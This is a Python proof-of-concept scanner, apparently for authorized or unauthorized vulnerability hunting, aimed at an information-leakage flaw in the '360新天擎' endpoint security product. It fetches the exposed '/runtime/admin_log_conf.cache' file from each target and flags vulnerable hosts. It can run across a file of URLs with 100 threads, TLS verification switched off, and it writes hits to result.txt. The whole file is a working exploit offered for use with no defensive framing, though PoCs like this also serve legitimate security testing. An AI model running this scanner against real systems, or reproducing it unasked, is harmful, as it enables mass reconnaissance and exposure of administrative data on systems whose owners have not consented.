import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """"
  _        __                            _   _               _            _                    
 (_)_ __  / _| ___  _ __ _ __ ___   __ _| |_(_) ___  _ __   | | ___  __ _| | ____ _  __ _  ___ 
 | | '_ \| |_ / _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |/ _ \/ _` | |/ / _` |/ _` |/ _ \
 | | | | |  _| (_) | |  | | | | | | (_| | |_| | (_) | | | | | |  __/ (_| |   < (_| | (_| |  __/
 |_|_| |_|_|  \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| |_|\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                    |___/      
                                                                                version: 1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='360新天擎 information leakage! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    #构造的POC
    url = target+'/runtime/admin_log_conf.cache'
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
    }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5).text
        #判断是否存在信息泄露
        if '/api/node/login' in res:
            print(f"[+]该url存在漏洞{target}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url不存在漏洞{target}")
    except Exception as e:
        print(f"[*]该url存在问题{target}"+e)

if __name__ == '__main__':
    main()